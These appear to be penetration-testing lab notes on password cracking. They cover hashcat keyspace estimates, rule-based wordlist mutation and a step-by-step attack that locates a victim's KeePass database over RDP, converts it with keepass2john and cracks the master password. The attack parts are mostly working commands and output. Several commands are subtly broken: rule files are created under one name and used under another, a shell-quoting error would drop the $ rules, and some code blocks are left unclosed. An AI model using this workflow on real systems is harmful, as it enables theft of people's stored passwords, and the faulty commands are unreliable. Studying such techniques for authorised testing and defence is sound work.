# Calculate the cracking time of a hash

Before we begin cracking passwords, let's calculate the cracking time of various hash representations.
Cracking time = ***keyspace*** / hash rate.

The ***keyspace*** consists of the character set to the power of the amount of characters or length of the original information (password).
- For example, if we use the lower-case Latin alphabet (26 characters), upper case alphabet (26 characters), and the numbers from 0 to 9 (10 characters), we have a character set of 62 possible variations for every character. If we are faced with a five-character password, we are facing 62 to the power of five possible passwords containing these five characters


Calculating crack time
```bash
# Calculate the keyspace  for a 5 char pw using all lowercase, uppercase, and 0-9 digits (62 possible chars per pw char position)
python3 -c "print(62**5)"
	916132832

# Calculate the hash rate
hashcat -b

# Rule-based Attack

https://hashcat.net/wiki/doku.php?id=rule_based_attack

Automating the process of changing (or _mutating_) a wordlist before sending it to a target
- Used when complex passwords are enforced
- Increases number of attempted passwords tremendously.  Careful getting locked out.

Create a rule file containing one or more rules and use it with a cracking tool.

Individual rules are implemented through **rule functions**, which are used to modify existing passwords contained in a wordlist.
An individual rule consists of one or more rule functions. We will often use multiple rule functions in each rule.

A way to craft a mutated list to fit a rule function like a Capitalized character, Special Character, and Numerical value

#### When asked to put a number in a pw, people usually append numbers
```bash
# Prep a wordlist to attack a Rule Function
head /usr/share/wordlists/rockyou.txt > demo.txt

# Remove only digit passwords
sed -i '/^1/d' demo.txt

cat demo.txt
	password
	iloveyou
	princess
	rockyou
	abc123

# Create a rule file to append a 1 to each
	# Escape the special character "$" to echo it into the file correctly.
echo \$1 > demo.rule

# Test
	# -r specifies the rule list
	# --stdout specifies debugging mode (only displays mutated list)
hashcat -r demo.rule --stdout demo.txt
	password1
	iloveyou1
	princess1
	rockyou1
	abc1231
```

The [Hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack) Wiki provides a list of all possible rule functions with examples.
If we want to add a character, the simplest form is to prepend or append it.
- **$** function to append
- **^** to prepend

Both of these functions expect one character after the function selector.
- For example, if we want to prepend a "3" to every password in a file, the corresponding rule function would be ^3.

#### When asked to put an uppercase letter in a pw, people usually use them as the first letter
```bash
# Craft rule file for permutations
# Rule functions are on the same line separated by a space
echo "$1 c" > demo1.txt

# Test
# Uses them consecutively on each pw of the wordlist
# Result is that the first character of each pw is capitalized & a 1 appended to each
hashcat -r demo1.rule --stdout demo.txt
	Password1
	Iloveyou1
	Princess1
	Rockyou1
	Abc1231

# Craft another rule file for permutations
# Rule functions are on separate lines.
cat > demo2.txt
$1
c
# Ctrl + D

# Test
# Second line is interpreted as a new rule
# Each rule is used separately, resulting in two mutated passwords for every password from the wordlist.
hashcat -r demo2.rule --stdout demo.txt
	password1
	Password
	iloveyou1
	Iloveyou
	princess1
	Princess
```

#### When asked to put a special character in a pw, people usually use them at the end either before or after numbers
```bash
# Add $! to end of the passwords
echo "$1 c $!" > demo1.txt

# Test
hashcat -r demo1.rule --stdout demo.txt
	Password1!
	Iloveyou1!
	Princess1!
	Rockyou1!
	Abc1231!

# Craft another rule file for permutations
# Rule functions are on separate lines.
echo "$! $1 c" > demo2.txt

# Test
hashcat -r demo2.rule --stdout demo.txt
	Password!1
	Iloveyou!1
	Princess!1
	Rockyou!1
	Abc123!1
```

Rules are applied left to right, so
- **demo1.txt** -> Append '1', Capitalize, Append '!'
- **demo2.txt** -> Append '!', Append '1', Capitalize

#### Adjust rockyou for a password policy requiring an upper case letter, a numerical value, and a special to crack a hash
```bash
# Create file with discovered hash
echo "f621b6c9eab51a3e2f4e167fee4c6860" > crackme.txt

# Create rule file to append the "ever-popular" '1', '2', and '123'
echo "$1 c $!" > demo3.rule
echo "$2 c $!" >> demo3.rule
echo "$1 $2 $3 c $!" >> demo3.rule

# Crack
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
	f621b6c9eab51a3e2f4e167fee4c6860:Computer123!
```


Always consider human behavior and convenience with regard to passwords
- Most users use a main word and modify it to fit a password policy, perhaps appending numbers and special characters.
- When an upper case letter is required, most users capitalize the first letter.
- When special characters are required, most users add the special character at the end of the password and rely on characters on the left side of the keyboard since these digits are easy to reach and type

Can also use Hashcat's rules as well
```bash
ls -la /usr/share/hashcat/rules/
	total 2588
	-rw-r--r-- 1 root root    933 Dec 23 08:53 best64.rule

# Methodology

***hash-identifier*** or ***[hashid](Tools.md#hashid)*** can be used to determine the hash type.

Depending on the hashing algorithm and the source of the hash, we may need to check if it's already in the correct format.
- If not, need to use helper tools to change the representation of the hash into the expected format for the cracking tool.

Also determine the feasibility of a cracking attempt.
- If the calculated crack time exceeds what's feasible during a test, may need to reconsider

Consider wordlist prep.
- Nearly all cases should contain a mutated wordlist & rule-based attack instead of a straight dictionary attack.
- Investigate potential pw policies and other pw vectors (eg: online pw leak sites)
	- Otherwise, may need to run multiple wordlists with/without pre-existing rules for a broad coverage of possible pws.

Take extra care when copying any hashes
- Extra space or newline could render efforts worthless
- Be sure of hash type being used!

# Password Manager Attack

Demonstration:
- Extract PW Manager's database
- Transform the file into a format usable by Hashcat
- Crack the Master DB PW

1. Begin by gaining a foothold on a system via RDP (assuming creds were obtained for a user)
	- Best by connecting a folder to share
	- `xfreerdp /cert-ignore /compression /auto-reconnect /u:jason /p:lab /v:192.168.210.203 /drive:test,/home/kali/`
  
2. Enumerate/ Check installed systems
	- As we have GUI access via RDP, use the *Apps & features* function of Windows.
		- Windows Icon > "Apps" > *Add or remove programs*
	![](keepass.png)\
3.  KeePass is discovered
	- Database is stored as a *.kdbx* file
	- May be more than 1 database
  
4. Locate all *.kdbx* files on the system
```powershell
# Via PowerShell cmdlet
PS C:\Users\jason > Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Via cmd prompt
cd C:\
dir /s *.kdbx

# Result
    Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022  10:33 AM           1982 Database.kdbx
```
5. Transfer file to Kali system to prepare the attack

6.  Use John's transformation script to format hashes
```bash
ll Database.kdbx
	-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx

keepass2john Database.kdbx > keepass.hash

cat keepass.hash
	Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

7. As John prepended the filename *Database* to the hash, we'll need to remove it
```bash
vim keepass.hash

cat keepass.hash
	$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

8. Determine the hash type for KeePass
```bash
hashcat --help | grep -i "KeePass"
	13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
	29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
```
- We'll use the first one as it's not *keyfile only mode*

9. Prepare the wordlist
	- Will use the ***rockyou.txt*** combined with Hashcat's-provided rule: ***rockyou-30000.rule***
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
	$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
```

10. Now with the cracked pw, you can have access to all the user's stored passwords.
